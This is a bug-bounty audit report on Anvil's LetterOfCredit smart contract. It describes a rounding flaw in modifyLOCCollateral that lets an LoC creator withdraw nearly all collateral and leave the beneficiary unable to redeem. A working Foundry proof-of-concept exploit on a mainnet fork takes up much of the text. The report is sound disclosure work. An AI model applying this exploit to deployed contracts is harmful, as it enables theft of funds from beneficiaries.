# #36910 \[SC-Critical] LoC: The creator can withdraw the entire collateral of a Dynamic LoC making it

**Submitted on Nov 19th 2024 at 14:18:21 UTC by @max10afternoon for** [**Audit Comp | Anvil: Letters of Credit**](https://immunefi.com/audit-competition/audit-comp-anvil-letters-of-credit)

* **Report ID:** #36910
* **Report Type:** Smart Contract
* **Report severity:** Critical
* **Target:** <https://github.com/AcronymFoundation/anvil-contracts/blob/main/contracts/LetterOfCredit.sol>
* **Impacts:**
  * Protocol insolvency

## Description

## Brief/Intro

Due to an unsafe check inside the modifyLOCCollateral function, the creator can withdraw the entirety of the collateral (minus some wei of approximation), making the LoC completly insolvent, defrauding the beneficiary (as it will no longer be possible to redeem the accredited amount) and breaking the main invariant of the contract: LOCs always being redeemable for their credited token value

## Vulnerability Details

The modifyLOCCollateral function checks that there is still enough collateral to cover the credited amount in case of the decrease: \`\`\`

```
        uint16 cfBasisPoints &#x3D; Pricing.collateralFactorInBasisPoints(
            newCollateralAmount,
            loc.creditedTokenAmount,
            price
        );
        if (cfBasisPoints &gt; requiredCollateralFactorBasisPoints)
            revert InsufficientCollateral(requiredCollateralFactorBasisPoints, cfBasisPoints);
```

\`\`\` with newCollateralAmount being what is left in the reservation after the amount gets modified.

The collateralFactorInBasisPoints function performs the following check: \`\`\` uint256 collateralInCredited = collateralAmountInCreditedToken(\_collateralTokenAmount, \_price); // Don't divide by 0 if (collateralInCredited == 0) { return 0; } \`\`\`

with collateralAmountInCreditedToken containing a division it self (With Pyht as an oracle the exponent will almost always negative, or at least it is, for the two currently listed token in the collateral contract: USDC and WETH): \`\`\` if (\_price.exponent < 0) { return (\_collateralTokenAmount \* \_price.price) / (10 \*\* uint256(int256(-1 \* \_price.exponent))); } else { \`\`\` This means that if the collateral left in the reservation after it gets modified is extremely small (aka if they withdraw almost the entire amount leaving just 1 decimal worth of weis to bypass a sanity check inside of the collateral vault), the collateralAmountInCreditedToken function will return 0, and therefor collateralFactorInBasisPoints will also return 0, meaning that the check inside of modifyLOCCollateral *"cfBasisPoints > requiredCollateralFactorBasisPoints"* will always pass. Allowing the creator to withdraw the full collateral (minus 1 wei of approximation to bypass the sanity check inside of the collateral contract), making the LoC completely insolvent. Since the modifyLOCCollateral function doesn't check if the cfBasisPoints is 0, this check is completely unsafe.

This will mean that the LoC is no longer redeemable as a similar check with a similar logic inside of \_calculateLiquidationContext will revert if the returned value is 0. And even if it were to be redeemable it would still provide almost 0 value instead of the accredited amount, making the LoC completely insolvent and breaking the main invariant of the contract.

## Impact Details

The creator can withdraw the entire claimable collateral making the LoC completely insolvent. And they have economical incentives to do so, as they can issue a letter of credit, and later withdraw it's entire value whenever they want, instead of having said value transferred to the beneficiary.

Also this will break the main invariant of the contract: LOCs always being redeemable for their credited token value (ignoring adverse market condition cases), as the LoC will be no longer redeemable (en even if it would, it would be redeemable for almost 0). without requiring any fluctuation in the assets price.

## Proof of Concept

*Note on the PoC: Since the LetterOfCredit in scope is not deployed yet, this PoC cannot use a fully forked environment, as it will be necessary to first deploy the contract, initialize and configure it to interact with the already deployed on chain components (vault, oracle, tokens etc). This will be done with "arbitrary" values, that should not make any difference in the results of the PoC (since the only relevant parameters, namely the prices, will be taken from the on chain Pyth oracle).*

#### PoC

To reproduce the PoC, clone the github repository "<https://github.com/AcronymFoundation/anvil-contracts/tree/main>" which contains the in-scope asset "<https://github.com/AcronymFoundation/anvil-contracts/blob/main/contracts/LetterOfCredit.sol?utm\\_source=immunefi>". Than initiate a foundry project in the main directory and install the standard Open Zeppelin libraries.

Than copy the following foundry script in the 'test' folder and copy your Alchemy API key in the URL on line '155': \`\`\` // SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.0;

import "forge-std/Test.sol"; import "forge-std/console.sol";

import "./../contracts/interfaces/IPriceOracle.sol"; import "./../contracts/interfaces/ICollateral.sol"; import "./../contracts/interfaces/ILiquidator.sol";

import "./../contracts/Pricing.sol"; import "./../contracts/LetterOfCredit.sol"; import "./../contracts/test/MockPriceOracle.sol";

import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol"; import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Utils.sol"; import { Upgrades } from "openzeppelin-foundry-upgrades/Upgrades.sol";

interface IStruct{

```
struct CollateralizableContractApprovalConfig {
    address collateralizableAddress;
    bool isApproved;
}

struct LOC {
    uint96 collateralId;
    address creator;
    // --- storage slot separator
    address beneficiary;
    // NB: uint32 gets us to the year 2106. If we hit that, redeploy.
    uint32 expirationTimestamp;
    uint16 collateralFactorBasisPoints;
    uint16 liquidatorIncentiveBasisPoints;
    // --- storage slot separator
    ICollateral collateralContract;
    address collateralTokenAddress;
    uint256 collateralTokenAmount;
    uint256 claimableCollateral;
    address creditedTokenAddress;
    uint256 creditedTokenAmount;
}


struct CreditedTokenConfig {
    address tokenAddress;
    uint256 minPerDynamicLOC;
    uint256 maxPerDynamicLOC;
    uint256 globalMaxInDynamicUse;
}


struct AssetPairCollateralFactor {
    address collateralTokenAddress;
    address creditedTokenAddress;
    CollateralFactor collateralFactor;
}

struct CollateralFactor {
    uint16 creationCollateralFactorBasisPoints;
    uint16 collateralFactorBasisPoints;
    uint16 liquidatorIncentiveBasisPoints;
}
```

}

interface IUsableLetterOfCredit is IStruct {

```
function createDynamicLOC(
    address _beneficiary,
    address _collateralTokenAddress,
    uint256 _collateralTokenAmount,
    address _creditedTokenAddress,
    uint256 _creditedTokenAmount,
    uint32 _expirationTimestamp,
    bytes calldata _oraclePriceUpdate,
    bytes calldata _collateralizableAllowanceSignature
) external returns (uint96); 


function redeemLOC(
    uint96 _locId,
    uint256 _creditedAmountToRedeem,
    address _destinationAddress,
    address _iLiquidatorToUse,
    bytes calldata _oraclePriceUpdate,
    bytes memory _beneficiaryAuthorization
) external;

function getLOC(uint96 _id) external view returns (LOC memory);

function modifyLOCCollateral(
    uint96 _locId,
    int256 _byAmount,
    bytes calldata _oraclePriceUpdate,
    bytes calldata _collateralizableAllowanceSignature
) external;

function upsertCollateralFactors(
    AssetPairCollateralFactor[] calldata _assetPairCollateralFactors
) external;
```

}

interface ICollateralVault is ICollateral, IStruct {

```
function depositAndApprove(
    address[] calldata _tokenAddresses,
    uint256[] calldata _amounts,
    address _collateralizableContractAddressToApprove
) external ;

function upsertCollateralizableContractApprovals(
    CollateralizableContractApprovalConfig[] calldata _updates
) external;
```

}

contract AnvilTest is Test, IStruct {

```
uint256 mainnetFork;

address usdcAddress;
address wETHAddress;
address oracleAddress;
address collateralVaultAddress;

IERC20 usdc;
IERC20 wETH;

IPriceOracle oracle;
ICollateralVault collateralVault;


CreditedTokenConfig[] creditTokenCongigs;
AssetPairCollateralFactor[] assetPairCollateralFactors;
CollateralizableContractApprovalConfig[] updates;

uint256[] amounts;
address[] addresses;

LetterOfCredit letterOfCreditImplementation;

ERC1967Proxy proxy;

IUsableLetterOfCredit letterOfCredits;

address user;

function setUp() public {

    mainnetFork &#x3D; vm.createFork(&quot;https://eth-mainnet.g.alchemy.com/v2/&lt;Copy your Alchemy API key here&gt;&quot;);

    vm.selectFork(mainnetFork);
    vm.rollFork(20989710); 

    usdcAddress &#x3D; address(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    wETHAddress &#x3D; address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    collateralVaultAddress &#x3D; address(0x5d2725fdE4d7Aa3388DA4519ac0449Cc031d675f);

    user &#x3D; address(0x123);


    usdc &#x3D; IERC20(usdcAddress);
    wETH &#x3D; IERC20(wETHAddress);

   
    oracleAddress &#x3D; address(0xC6f3405c861Fa0dca04EC4BA59Bc189D1d56Ee05);
    oracle &#x3D; IPriceOracle(oracleAddress); 
    
    collateralVault &#x3D; ICollateralVault(collateralVaultAddress);


    CollateralFactor memory collateralFactor &#x3D; CollateralFactor(1e3,1e3+1,5e3);
    creditTokenCongigs.push( CreditedTokenConfig(usdcAddress, 1, type(uint256).max, type(uint256).max)); 
    creditTokenCongigs.push( CreditedTokenConfig(wETHAddress, 1, type(uint256).max, type(uint256).max)); 
    assetPairCollateralFactors.push(AssetPairCollateralFactor(wETHAddress, usdcAddress, collateralFactor));


    letterOfCreditImplementation &#x3D; new LetterOfCredit();

    bytes memory data &#x3D; abi.encodeWithSelector( letterOfCreditImplementation.initialize.selector,
        collateralVault,
        oracle,
        type(uint16).max,
        type(uint32).max,
        creditTokenCongigs,
        assetPairCollateralFactors
    );


    proxy &#x3D; new ERC1967Proxy(address(letterOfCreditImplementation),data);

    letterOfCredits &#x3D; IUsableLetterOfCredit(address(proxy));

    updates.push(CollateralizableContractApprovalConfig(address(letterOfCredits), true));
    vm.prank(0x4eeB7c5BB75Fc0DBEa4826BF568FD577f62cad21);
    collateralVault.upsertCollateralizableContractApprovals(updates);

    vm.startPrank(0x4B16c5dE96EB2117bBE5fd171E4d203624B014aa);
    usdc.transfer(user, 1e13);
    vm.stopPrank();

    vm.startPrank(0xF04a5cC80B1E94C69B48f5ee68a08CD2F09A7c3E);
    wETH.transfer(user, 1e21);
    vm.stopPrank();


    vm.startPrank(user);
    usdc.approve(collateralVaultAddress, type(uint256).max);
    wETH.approve(address(letterOfCredits), type(uint256).max);
    wETH.approve(collateralVaultAddress, type(uint256).max); 
    vm.stopPrank();


}


function testFullWithdraw() public {

    amounts &#x3D; [1e19];
    addresses &#x3D; [wETHAddress];

    address redeemer &#x3D; address(0x321);


    Pricing.OraclePrice memory priceBefore;
    priceBefore &#x3D; oracle.getPrice(usdcAddress, wETHAddress);


    vm.startPrank(user);


    collateralVault.depositAndApprove(addresses, amounts, address(letterOfCredits));
    uint96 id &#x3D; letterOfCredits.createDynamicLOC(redeemer, wETHAddress, 4e17, usdcAddress, 1e8, uint32(block.timestamp + 12345), &quot;&quot;, &quot;&quot;);

    LOC memory locDataBefore &#x3D; letterOfCredits.getLOC(id);
    letterOfCredits.modifyLOCCollateral(id, -(4e17 - 10), &quot;&quot;, &quot;&quot;);


    LOC memory locDataAfter &#x3D; letterOfCredits.getLOC(id);
    
    //Creator was able to redeem the full collateral (minus some aproximation)
    console.log(locDataAfter.claimableCollateral);
    assertGt(locDataBefore.claimableCollateral, locDataAfter.claimableCollateral);
    assertEq(locDataAfter.claimableCollateral, 9);

    vm.stopPrank();


    vm.startPrank(redeemer);

    //Redeemer is no longer capable of redeeming the LoC as there is not eough collateral to do so
    vm.expectRevert();
    letterOfCredits.redeemLOC(id, locDataBefore.creditedTokenAmount, redeemer, address(0), &quot;&quot;, &quot;&quot;);

    vm.stopPrank();


    Pricing.OraclePrice memory priceAfter;
    priceAfter &#x3D; oracle.getPrice(usdcAddress, wETHAddress);
```

//Broken invariant: LoC cannot be redeemed for the credited amount even without any price fluctuation. assertEq(priceBefore.price, priceAfter.price);

```
}
```

}

\`\`\`
